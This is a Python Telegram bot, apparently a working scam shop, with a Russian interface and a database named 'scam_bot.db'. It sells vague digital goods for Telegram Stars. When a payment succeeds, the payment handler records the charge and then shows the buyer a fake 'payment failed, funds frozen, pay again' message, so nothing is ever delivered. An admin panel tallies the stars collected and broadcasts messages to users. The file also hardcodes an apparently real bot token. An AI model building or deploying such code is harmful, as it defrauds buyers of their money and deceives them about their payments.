import asyncio
import logging
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery, LabeledPrice, PreCheckoutQuery,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8237086271:AAFOo4KN1Xpht9iQB9zlk2NKX3D1dq1NND0"
ADMIN_ID = 6893832048

router = Router()

# НАСТРОЙКА БАЗЫ ДАННЫХ
conn = sqlite3.connect('scam_bot.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS payments (user_id INT, amount INT, charge_id TEXT, date TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INT PRIMARY KEY, join_date TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price INT)''')
c.execute("INSERT OR IGNORE INTO products (name, price) VALUES ('Доступ к каналу', 50), ('1000 видео', 25), ('500 видео', 10)")
conn.commit()

# ==================== ПОЛЬЗОВАТЕЛЬСКАЯ ЧАСТЬ ====================
def store_keyboard():
    builder = InlineKeyboardBuilder()
    c.execute("SELECT id, name, price FROM products")
    for prod_id, prod_name, prod_price in c.fetchall():
        builder.button(text=f"{prod_name} - {prod_price}⭐", callback_data=f"buy_{prod_id}")
    builder.button(text="🛒 Мои заказы", callback_data="my_orders")
    builder.adjust(1)
    return builder.as_markup()

@router.message(CommandStart())
async def start_cmd(message: Message):
    c.execute("INSERT OR IGNORE INTO users (user_id, join_date) VALUES (?, ?)", (message.from_user.id, datetime.now().isoformat()))
    conn.commit()
    await message.answer(
        f"🛒 **Магазин**\n\nВыберите товар для покупки. После оплаты вы получите продукт.\n\n⚠️ **Внимание:** Возможны задержки из-за нагрузки на сервер.",
        reply_markup=store_keyboard(),
        parse_mode="Markdown"
    )

@router.callback_query(F.data.startswith("buy_"))
async def buy_process(callback: CallbackQuery):
    product_id = int(callback.data.split("_")[1])
    c.execute("SELECT name, price FROM products WHERE id=?", (product_id,))
    product_name, price = c.fetchone()
    
    await callback.message.answer_invoice(
        title=f"Покупка: {product_name}",
        description=f"Мгновенная доставка после оплаты.",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=product_name, amount=price)],
        payload=f"payload_{product_id}_{callback.from_user.id}"
    )

@router.pre_checkout_query()
async def pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await pre_checkout_query.answer(ok=True)

@router.message(F.successful_payment)
async def successful_payment(message: Message):
    c.execute("INSERT INTO payments (user_id, amount, charge_id, date) VALUES (?, ?, ?, ?)",
              (message.from_user.id, message.successful_payment.total_amount,
               message.successful_payment.telegram_payment_charge_id, datetime.now().isoformat()))
    conn.commit()
    
    error_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Повторить оплату", callback_data="retry_payment")]
    ])
    await message.answer(
        f"❌ **Ошибка обработки платежа**\n\nТранзакция #TX{message.successful_payment.telegram_payment_charge_id[-8:]} не удалась. Средства временно заморожены. Пожалуйста, повторите оплату.",
        reply_markup=error_kb,
        parse_mode="Markdown"
    )

@router.callback_query(F.data == "retry_payment")
async def retry_payment(callback: CallbackQuery):
    await callback.message.answer("⚠️ Используйте /start чтобы выбрать товар заново.")

# ==================== АДМИН ПАНЕЛЬ ====================
def admin_main_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="📦 Управление товарами", callback_data="admin_products")
    builder.button(text="📊 Статистика", callback_data="admin_stats")
    builder.button(text="📢 Рассылка", callback_data="admin_broadcast")
    builder.button(text="➕ Добавить товар", callback_data="admin_add_product")
    builder.adjust(1)
    return builder.as_markup()

@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("👨‍💻 **Панель администратора**", reply_markup=admin_main_keyboard(), parse_mode="Markdown")

# ---- УПРАВЛЕНИЕ ТОВАРАМИ ----
@router.callback_query(F.data == "admin_products")
async def admin_products_list(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    builder = InlineKeyboardBuilder()
    c.execute("SELECT id, name, price FROM products")
    products = c.fetchall()
    
    if not products:
        await callback.answer("📭 Список товаров пуст")
        return
    
    for prod_id, prod_name, prod_price in products:
        builder.button(text=f"{prod_name} - {prod_price}⭐", callback_data=f"admin_edit_{prod_id}")
    
    builder.button(text="◀️ Назад", callback_data="admin_back")
    builder.adjust(1)
    await callback.message.edit_text("📦 **Выберите товар для редактирования:**", reply_markup=builder.as_markup(), parse_mode="Markdown")

# ---- РЕДАКТИРОВАНИЕ КОНКРЕТНОГО ТОВАРА ----
@router.callback_query(F.data.startswith("admin_edit_"))
async def admin_edit_product(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    product_id = int(callback.data.split("_")[2])
    c.execute("SELECT name, price FROM products WHERE id=?", (product_id,))
    prod_name, prod_price = c.fetchone()
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Изменить название", callback_data=f"admin_change_name_{product_id}")],
        [InlineKeyboardButton(text="💰 Изменить цену", callback_data=f"admin_change_price_{product_id}")],
        [InlineKeyboardButton(text="🗑️ Удалить товар", callback_data=f"admin_delete_{product_id}")],
        [InlineKeyboardButton(text="◀️ Назад к списку", callback_data="admin_products")]
    ])
    
    await callback.message.edit_text(
        f"📦 **Редактирование товара**\n\n🆔 ID: `{product_id}`\n📛 Название: `{prod_name}`\n💰 Цена: `{prod_price}⭐`\n\nВыберите действие:",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# ---- ВВОД НОВОГО НАЗВАНИЯ ----
@router.callback_query(F.data.startswith("admin_change_name_"))
async def admin_change_name_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    product_id = int(callback.data.split("_")[3])
    # Сохраняем ID товара в глобальную переменную (упрощённый подход)
    global editing_product_id, editing_mode
    editing_product_id = product_id
    editing_mode = "name"
    
    await callback.answer(f"✏️ Теперь отправьте новое название в чат", show_alert=True)
    await callback.message.answer(f"✏️ Отправьте новое название для товара ID {product_id}:")

# ---- ВВОД НОВОЙ ЦЕНЫ ----
@router.callback_query(F.data.startswith("admin_change_price_"))
async def admin_change_price_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    product_id = int(callback.data.split("_")[3])
    global editing_product_id, editing_mode
    editing_product_id = product_id
    editing_mode = "price"
    
    await callback.answer(f"💰 Теперь отправьте новую цену в чат", show_alert=True)
    await callback.message.answer(f"💰 Отправьте новую цену (число) для товара ID {product_id}:")

# ---- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ДЛЯ РЕДАКТИРОВАНИЯ ----
editing_product_id = None
editing_mode = None  # "name" или "price"

# ---- ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ ОТ АДМИНА ----
@router.message(F.text & F.from_user.id == ADMIN_ID)
async def admin_text_handler(message: Message):
    global editing_product_id, editing_mode
    
    text = message.text.strip()
    
    # Если включён режим редактирования названия
    if editing_mode == "name" and editing_product_id:
        try:
            c.execute("UPDATE products SET name = ? WHERE id = ?", (text, editing_product_id))
            conn.commit()
            await message.answer(f"✅ Название товара ID {editing_product_id} изменено на: {text}")
            editing_mode = None
            editing_product_id = None
            return
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
            return
    
    # Если включён режим редактирования цены
    elif editing_mode == "price" and editing_product_id:
        try:
            price = int(text)
            c.execute("UPDATE products SET price = ? WHERE id = ?", (price, editing_product_id))
            conn.commit()
            await message.answer(f"✅ Цена товара ID {editing_product_id} изменена на: {price}⭐")
            editing_mode = None
            editing_product_id = None
            return
        except:
            await message.answer("❌ Ошибка. Нужно число.")
            return
    
    # Если это добавление товара (формат: Название | Цена)
    if "|" in text:
        try:
            name, price = text.split("|")
            name = name.strip()
            price = int(price.strip())
            
            c.execute("INSERT INTO products (name, price) VALUES (?, ?)", (name, price))
            conn.commit()
            await message.answer(f"✅ Товар добавлен:\n📛 {name}\n💰 {price}⭐")
            return
        except:
            await message.answer("❌ Ошибка формата. Используйте: Название | 100")
            return
    
    # Если это рассылка (проверяем по контексту)
    if message.reply_to_message and "рассылка" in message.reply_to_message.text.lower():
        c.execute("SELECT user_id FROM users")
        users = c.fetchall()
        sent = 0
        for (user_id,) in users:
            try:
                await bot.send_message(user_id, text)
                sent += 1
            except:
                pass
        await message.answer(f"✅ Рассылка отправлена {sent}/{len(users)} пользователям")
        return

# ---- УДАЛЕНИЕ ТОВАРА ----
@router.callback_query(F.data.startswith("admin_delete_"))
async def admin_delete_product(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    product_id = int(callback.data.split("_")[2])
    c.execute("DELETE FROM products WHERE id=?", (product_id,))
    conn.commit()
    await callback.answer(f"🗑️ Товар ID {product_id} удален", show_alert=True)
    await admin_products_list(callback)

# ---- ДОБАВЛЕНИЕ ТОВАРА ----
@router.callback_query(F.data == "admin_add_product")
async def admin_add_product_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    await callback.answer("➕ Теперь отправьте название и цену в формате: Название | Цена", show_alert=True)
    await callback.message.answer("➕ Для добавления товара отправьте в формате:\n`Название товара | 100`")

# ---- СТАТИСТИКА ----
@router.callback_query(F.data == "admin_stats")
async def admin_stats_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    c.execute("SELECT COUNT(*) FROM users")
    users = c.fetchone()[0]
    c.execute("SELECT COUNT(*), SUM(amount) FROM payments")
    pays, stars = c.fetchone()
    stars = stars if stars else 0
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="admin_back")]
    ])
    
    await callback.message.edit_text(
        f"📊 **Статистика**\n\n👥 Пользователей: `{users}`\n💰 Платежей: `{pays}`\n⭐️ Всего звёзд: `{stars}`\n\n💾 База: `scam_bot.db`",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# ---- РАССЫЛКА ----
@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    
    await callback.answer("📢 Теперь отправьте текст рассылки в чат", show_alert=True)
    await callback.message.answer("📢 Отправьте текст для рассылки всем пользователям:")

# ---- КНОПКА НАЗАД ----
@router.callback_query(F.data == "admin_back")
async def admin_back_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.message.edit_text("👨‍💻 **Панель администратора**", reply_markup=admin_main_keyboard(), parse_mode="Markdown")

# ==================== ЗАПУСК ====================
async def main():
    global bot
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
